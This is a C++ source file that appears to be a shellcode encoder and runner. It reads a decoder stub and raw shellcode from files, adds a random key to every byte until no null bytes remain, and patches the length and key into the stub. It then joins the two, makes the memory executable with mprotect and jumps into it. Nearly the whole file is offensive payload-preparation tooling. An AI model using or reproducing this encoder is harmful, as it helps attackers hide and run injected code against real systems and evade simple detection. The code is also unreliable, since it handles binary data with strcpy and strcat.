
#include <iostream>
#include <fstream>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <sys/mman.h>




using std::cout;
using std::cin;
using std::ifstream;





void print_array(char *array, int n){
// 	bool f=false;
	;
	for(int i=0; i<n; ++i){
		printf("%2x ", (unsigned char)array[i]);
// 		cout << std::hex << (unsigned int)array[i] << ' ';
			 // << std::dec << " - " << (int)array[i] << '\n';
		/*if(f==true){
			f=false;
			cout << ' ';
		}
		else
			f=true;
		*/
	}
	cout << std::dec << '\n';
}



char *crypt(char *shcode, char *decoder, int &len_shcode, int len_decoder){
	int crypt_value, crypt_index=0;
	srand(time(0));
	crypt_value = rand()%29+1;
	
	
	
	for(int i=0; i<len_decoder; ++i){
		static bool j = false;
		if(decoder[i] == '\0'){
			if(j == false)
				decoder[i] = (char)len_shcode;
			else{
				crypt_index = i;
// 				cout << "1crypt_index= " << crypt_index << '\n';
				decoder[i] = (char)crypt_value;
			}
			j=true;
		}
	}
	
	bool nullbyte=false;
	do{
		if(nullbyte){
			crypt_value = rand()%29+1;
// 			cout << "2crypt_index= " << crypt_index << '\n';
			decoder[crypt_index] = (char)crypt_value;
			nullbyte=false;
		}
		for(int i=0; i<len_shcode; ++i){
			shcode[i] +=crypt_value;
			if((char)shcode[i] == '\0'){
				nullbyte=true;
				break;
			}
		}
	}while(nullbyte);
	
// 	print_array(shcode, len_shcode);
// 	cout << '\n';
// 	print_array(decoder, len_decoder);
// 	cout << '\n';
	len_shcode += len_decoder;
	char *new_shellcode = new char[len_shcode];
	strcpy(new_shellcode, decoder);
	strcat(new_shellcode, shcode);
	
	return new_shellcode;
	
}






int main(){
	char *shcode = new char[100], *decoder = new char[100];
	ifstream file1, file2;
	file1.open("shcode1");
	file2.open("shcode2");
	if(!( (file1.is_open())&&(file2.is_open()) )){
		cout << "file1 or file2 wasn't open. Maybe incorrect file name\n";
		return 0;
	}
	
	int len_shcode, len_decoder;
	
	for(int i=0; !file1.eof(); ++i){
		file1.get(decoder[i]);
		len_decoder = i;
	}
	for(int i=0; !file2.eof(); ++i){
		file2.get(shcode[i]);
		len_shcode = i;
	}
	file1.close();
	file2.close();
	
	print_array(shcode, len_shcode);
	cout << '\n';
	print_array(decoder, len_decoder);
	cout << '\n';
	
// 	cout << len_shcode << '\n' << len_decoder << '\n';
	char *new_shcode;
	new_shcode = crypt(shcode, decoder, len_shcode, len_decoder);
	
	cout << len_shcode << '\n';
	print_array(shcode, len_shcode);
	cout << '\n';
	
	print_array(new_shcode, len_shcode);
	cout << '\n';
	
	void *ptr = (void*)((long int)new_shcode&(~4095));
	mprotect(ptr, 1024, 7);
	printf("%p\n", new_shcode);
	(*(void(*)()) new_shcode)();
	delete []shcode;
	delete []decoder;
	delete []new_shcode;
	return 0;
}








